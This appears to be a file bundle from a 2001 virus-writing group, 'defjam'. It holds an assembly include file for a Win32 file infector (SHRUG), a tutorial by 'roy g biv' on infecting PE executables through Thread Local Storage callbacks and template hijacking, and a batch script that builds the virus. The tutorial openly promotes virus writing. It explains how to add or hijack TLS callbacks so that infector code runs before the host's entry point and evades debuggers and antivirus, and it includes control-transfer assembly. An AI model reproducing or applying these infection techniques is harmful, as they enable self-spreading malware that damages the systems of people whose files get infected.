RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

PAGE_READWRITE                  equ     04

align           1                               ;byte-packed structures
krncrcstk       struct
        kSfcIsFileProtected     dd      ?       ;appended from other location
        kUnmapViewOfFile        dd      ?
        kSetFileTime            dd      ?
        kSetFileAttributesW     dd      ?
        kSetFileAttributesA     dd      ?
        kSetCurrentDirectoryW   dd      ?
        kSetCurrentDirectoryA   dd      ?
        kMultiByteToWideChar    dd      ?
        kMapViewOfFile          dd      ?
        kLoadLibraryA           dd      ?
        kGlobalFree             dd      ?
        kGlobalAlloc            dd      ?
        kGetVersion             dd      ?
        kGetTickCount           dd      ?
        kGetFullPathNameW       dd      ?
        kGetFullPathNameA       dd      ?
        kFindNextFileW          dd      ?
        kFindNextFileA          dd      ?
        kFindFirstFileW         dd      ?
        kFindFirstFileA         dd      ?
        kFindClose              dd      ?
        kCreateFileMappingA     dd      ?
        kCreateFileW            dd      ?
        kCreateFileA            dd      ?
        kCloseHandle            dd      ?
krncrcstk       ends
krncrc_count    equ     (size krncrcstk - 4) shr 2

tlsstruc        struct
        tlsrawbeg       dd      ?
        tlsrawend       dd      ?
        tlsindex        dd      ?
        tlsfuncptr      dd      ?
        tlsfiller       dd      ?
        tlsflags        dd      ?
        tlsfunc         dd      2 dup (?)
tlsstruc        ends

initstk         struct
        initret         dd      ?
        initDLLHandle   dd      ?
        initReason      dd      ?
        initReserved    dd      ?
initstk         ends

sehstruc        struct
        sehkrnlret      dd      ?
        sehexcptrec     dd      ?
        sehprevseh      dd      ?
sehstruc        ends

FILETIME        struct
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME        ends

WIN32_FIND_DATA struct
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        <?>
        ftLastAccessTime        FILETIME        <?>
        ftLastWriteTime         FILETIME        <?>
        dwFileSizeHigh          dd              ?
        dwFileSizeLow           dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               dw              260 dup (?)
        cAlternateFileName      dw              14 dup (?)
WIN32_FIND_DATA ends

findlist        struct
        findprev        dd                      ?
        findhand        dd                      ?
        finddata        WIN32_FIND_DATA         <?>
findlist        ends

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr           ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregs      dd      8 dup (?)
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

mapstack        struct
        mapfilesize     dd      ?
        mapmapret       dd      ?
        mapinfret       dd      ?
        mapattrib       dd      ?
mapstack        ends

infectstk       struct
        infdelta        dd              ?
        infmapview      dd              ?
        inffilesize     dd              ?
        infseh          mapsehstk       <?>
infectstk       ends
align                                           ;restore default alignment
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SHRUG.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TLS.TXT]컴�
                             Thread Local Storage
                            The hidden entry point
                              roy g biv / defjam

                                 -= defjam =-
                                  since 1992
                     bringing you the viruses of tomorrow
                                    today!


Prologue:

Please excuse my English.  I'm still learning.


About the author:

Former  DOS/Win16  virus writer, author of several virus  families,  including
Ginger  (see Coderz #1 zine for terrible buggy example, contact me for  better
sources  ;),  and  Virus Bulletin 9/95 for a description of what  they  called
Rainbow.   Co-author  of  world's first virus using circular  partition  trick
(Orsam,  coded  with  Prototype in 1993).  Designer of the world's  first  XMS
swapping  virus (John Galt, coded by RTFishel in 1995, only 30 bytes stub, the
rest  is swapped out).  Author of various retrovirus articles (eg see Vlad  #7
for the strings that make your code invisible to TBScan).  Went to sleep for a
number  of years.  This is my first virus for Win32.  It is the world's  first
virus using Thread Local Storage for replication.  It took me a week to design
it  and a whole day to write it.

I'm also available for joining a group.  Just in case anyone is interested. ;)


What is Thread Local Storage?

This is what Microsoft has to say about it:
"The  .tls  section  provides direct PE/COFF support for static  Thread  Local
Storage  (TLS).   TLS is a special storage class supported by Windows NT.   To
support  this  programming construct, the PE/COFF .tls section  specifies  the
following  information: initialization data, callback routines for  per-thread
initialization and termination, and the TLS index".

So,  Thread Local Storage (TLS) is a Microsoft invention for applications that
need  to  initialise  thread data before main execution begins.  To  do  this,
there  are callback pointers.  These functions execute before the code at  the
main  entry point!  To prove that, load my example code into any debugger  and
see  what happens.  Ho ho, we even fool SoftIce for NT, the god of  debuggers.
Clearly,  this  is a new way for viruses to run and probably the  AVers  don't
know about it yet, or if they do then they don't support it because no viruses
use it (maybe they said that about NTFS alternative streams too).

Some points now:
We  can ignore the reference to .tls because there is a field in the PE header
that  points to this structure anywhere in the file.  Unfortunately, it's true
that  it  works  only under Windows NT/2000/XP.  Under Windows  9x/Me,  simply
nothing  happens  and  those  functions never receive  control.  At  least  it
doesn't  crash. :)  Also,  NT/2000/XP require import section that imports  dll
that uses kernel32 APIs, else a page fault occurs.  This appears to be a bug.

The callback functions have the same parameters as a DLL entry-point function,
except that nothing is returned.  The declaration looks like this:

typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)
             (PVOID DllHandle, DWORD Reason, PVOID Reserved);

This means that there are three parameters on the stack, so TLS functions must
use RET 000Ch on exit.  The Reason parameter can take the following values:

Setting                 Value   Description
DLL_PROCESS_ATTACH      1       New process has started
DLL_THREAD_ATTACH       2       New thread has been created
DLL_THREAD_DETACH       3       Thread is about to be terminated
DLL_PROCESS_DETACH      0       Process is about to terminate

The DLL_PROCESS_ATTACH and DLL_PROCESS_DETACH messages mean that we are called
for  the  host startup (after CreateProcess() but before process entry  point)
and  shutdown  (from  within  ExitProcess()), and  the  DLL_THREAD_ATTACH  and
DLL_THREAD_DETACH   mean  that  we  are  called  for  thread  startup   (after
CreateThread()  but  before  thread  entry point) and  shutdown  (from  within
ExitThread()).   This  happens for EXEs and also DLLs (but only DLLs that  are
not  loaded with LoadLibrary).  No need to hook ExitProcess() anymore  because
we will be called by ExitProcess() automatically.

It  is important to know that NTDLL.DLL (not KERNEL32.DLL!) calls the callback
functions,  and  that  kernel32.dll is not in the SEH chain  when  the  ATTACH
messages  are sent, only when the DETACH messages are sent.  Thus, if you need
to  call  kernel32.dll APIs from an ATTACH message, then you cannot use a  SEH
walker  to  find kernel32.dll image base.  The good thing is that  the  import
table is filled already, so you can use the host imports.


What does TLS look like?

At offset 0xC0 in the PE header is the pointer to the TLS directory.
According to Microsoft documentation, the TLS directory has the format:

Offset  Size    Field                   Description
0x00    4       Raw Data Start VA       Starting address of the TLS template
0x04    4       Raw Data End VA         Address of last byte of TLS template
0x08    4       Address of Index        Location to receive the TLS index
0x0C    4       Address of Callbacks    Pointer to array of TLS callbacks
0x10    4       Size of Zero Fill       Size of unused data in TLS template
0x14    4       Characteristics         (reserved but not checked)

Notice  that the pointers are all virtual addresses (VA), not relative virtual
addresses  (RVA).   This means that if we add a TLS directory, we should  also
add  relocation items to the .reloc section, or simply remove all relocations.
The reason for this is that if the file is loaded to a different base address,
then  Windows NT/2000 will display the message box "The application failed  to
initialize correctly" and the file will not execute anymore.


What do the TLS fields mean?

The  TLS template contains data that are copied whenever a thread is  created.
These  data  can  also  be executable codes.  If the template  exists  (it  is
optional  and  so  the fields can be null) then when the  application  starts,
Windows  will allocate an array for the TLS pointers and store this pointer at
fs:0x2c.   For  each  thread  that is created, the size  of  the  template  is
allocated  from  the local heap, the data are copied to there, the pointer  is
stored  in the array, and the array index is stored in the TLS index field.  A
thread can get its pointer by this formula:
dword at (dword at fs:[0x2c] + (TLS index * 4))
Or some code:
mov eax, dword ptr fs:[2ch]             ;get pointer to array of TLS pointers
mov ecx, dword ptr [offset TLSIndex]    ;get TLS index
mov eax, dword ptr [ecx * 4 + eax]      ;get pointer to TLS data
then access data at [eax + offset]

The  Address  of  Callbacks  field contains the Virtual Address  of  an  null-
terminated  array of functions that receive the ATTACH/DETACH messages.  It is
valid  to have no entries in this array.  In that case, the field is  supposed
to point to four zero bytes, however the actual field can also be null.


How to use TLS?

There are a few simple ways to use TLS to infect a file:
add a callback pointer to existing array (or create new array)
alter one of the host callback pointers
alter the code in one of the callbacks
create a new TLS directory
hijack the TLS template and alter some code somewhere in the file

If  you  want to use the TLS method to infect a file, firstly check if  a  TLS
directory  exists already.  If it does, then you can pick at random a callback
routine  pointer and change it to point to your code.  If there is no existing
TLS  directory,  then  add one by setting correctly the pointers in  your  own
version.   The template addresses can be set to null and the index pointer can
point to any writable dword (including the Characteristics field because it is
not  used).  The callback pointer will point to the array of callback  routine
pointers,  one of which will be the virus entry point.  When this entry  point
receives control, the file is loaded fully into memory and the import table is
fixed  up.  This means that we can do anything that we would do normally, like
go  resident  or  call  API functions and spread to  other  files.   The  main
difference  is  that  we are guaranteed to be called at least twice,  once  on
startup  and  once on shutdown, and twice more for every thread that the  host
uses.   This means that we must be careful to avoid recursion because we  will
also be called if we use threads in our virus code.

Hijacking  the  TLS template is a technique that I discovered some time  later
during  my  research.  The idea is to make a copy of the TLS template and  add
the  virus code to it.  When the process starts (or a thread is created), then
the  virus code is copied by Windows into the heap.  This means that the  code
is  automatically placed into a executable and writable memory space,  without
any  call to malloc or memcopy.  The only thing that is required after that is
to  transfer  control to the code on the heap.  That is done by using the  TLS
index to get the heap pointer.

The transfer of control code would look something like this:
this code is in the file:
fib:
push    eax
push    ecx
mov     eax, dword ptr fs:[2ch]
mov     ecx, dword ptr [offset tls_index]
mov     eax, dword ptr [ecx * 4 + eax]
add     eax, size of original TLS template
call    eax
fie:

this code is on the heap:
pop     eax             ;get return address
pop     ecx             ;restore original ecx
sub     eax, fie - fib  ;point to first byte of code in file
xchg    eax, [esp]      ;store real return address and restore original eax
pushad                  ;now save all original registers
;rest of code is here.  do not forget to restore host bytes
popad                   ;restore all registers
ret                     ;return to host


Epilogue:

Now  you  want to look at my example code and then to make your own  examples.
There   are  many  possibilities  with  this  technique  that  make  it   very
interesting.  It is easy when you know how.  Just use your imagination.

TLSDemo1 has an inserted TLS directory and code that displays message box.
This code runs before main entry point.

TLSDemo2 has a hijacked TLS template and code that displays message box.
This code jumps from main entry point to heap without malloc or memcopy.


Greets to the old Defjam crew:

Prototype, RTFishel, Obleak, and The Gingerbread Man


rgb/dj jan 2001
iam_rgb@hotmail.com
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TLS.TXT]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
%tasm32%\bin\tlink32 /c /B:400000 /Tpe /aa /x /n %1.obj,,,%tasm32%\lib\import32.lib,
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE SHRUG
echo requires %tasm32% set to TASM directory (eg C:\TASM)

:end
echo.
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[MAKE.BAT]컴�
